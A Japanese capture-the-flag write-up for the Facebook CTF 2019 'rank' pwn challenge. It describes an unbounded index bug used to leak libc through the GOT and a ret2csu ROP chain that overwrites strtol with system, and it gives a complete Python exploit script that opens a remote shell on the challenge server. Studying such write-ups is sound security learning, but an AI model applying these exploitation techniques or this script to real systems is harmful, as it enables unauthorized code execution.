# [pwn 494pts] rank - Facebook CTF 2019
64ビットです。
```
$ checksec -f r4nk
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes	1		2	r4nk
```

bssに映画(?)のタイトルへのポインタがたくさんあり、ローカル変数に各タイトルへのポインタ一覧と対応するインデックスがあります。Rank機能によりこれを変更できるのですが、インデックスに制限が無いのでちょうどGOTを指すようなインデックスを指定すればローカル変数にGOTのアドレスが入ります。その後Showすることで簡単にlibcをリークできます。
また、ローカル変数を自由な範囲で書き換えられるので、リターンアドレスも書き換えられます。しかし、与えた整数は4バイトint型にに切り捨てられるので、0x00000000XXXXXXXXという値しか書き込めません。一見無理そうですが、PIEが無効なのでret2csuが使えます。
ret2csuでreadを呼び出してstrtolのGOTをsystemに書き換え、選択画面で`/bin/sh`を入力すればシェルが取れます。

```python
from ptrlib import *

def show():
    sock.recvuntil("> ")
    sock.sendline("1")
    ret = []
    for i in range(12):
        data = sock.recvline().rstrip().split(b". ")
        ret.append(data[1])
    return ret

def evil_show(fmt):
    sock.recvuntil("> ")
    sock.sendline(fmt)

def rank(i, pos):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("t1tl3> ")
    sock.sendline(str(i))
    sock.recvuntil("r4nk> ")
    sock.sendline(str(pos))

libc = ELF("./libc-2.27.so")
elf = ELF("./r4nk")
#sock = Process("./r4nk")
sock = Socket("challenges.fbctf.com", 1339)
addr_start = 0x400018 # address that points <start>
addr_list = 0x602080
addr_buf = 0x602100
plt_read = 0x4005f0
rop_pop_rdi = 0x00400b43
rop_pop_rsi_r15 = 0x00400b41
rop_prepare_reg = 0x00400b3a
rop_csu_init = 0x400b20

# libc leak
payload = b"A" * 8 + p64(elf.got("write"))
evil_show(payload)
rank(0, (addr_buf - addr_list) // 8 + 1)
addr_write = u64(show()[0])
libc_base = addr_write - libc.symbol("write")
addr_one_gadget = libc_base + 0x10a38c
dump("libc base = " + hex(libc_base))

# craft ROP chain
payload = [
    rop_prepare_reg,
    0,                 # rbx
    1,                 # rbp == rbx + 1
    elf.got("read"),   # r12 = &<func>
    0,                 # r13 = arg1
    elf.got("strtol"), # r14 = arg2
    0x8,               # r15 = arg3
    rop_csu_init,
    0xdeadbeef,
    0,          # rbx
    1,          # rbp == rbx + 1
    addr_start, # r12 = &<func>
    0,          # r13 = arg1
    0,          # r14 = arg2
    0,          # r15 = arg3
    rop_csu_init
]
for i, addr in enumerate(payload):
    assert 0 <= addr <= 0xffffffff
    rank(19 + i, addr)

# ROP it
sock.recvuntil("> ")
sock.sendline("3")

sock.send(p64(libc_base + libc.symbol("system")))

# get the shell!
sock.recvuntil("> ")
sock.sendline("/bin/sh\x00")

sock.interactive()
```

# 感想
自然な形でret2csuを使わせる問題で、よくできてるなぁと思いました。
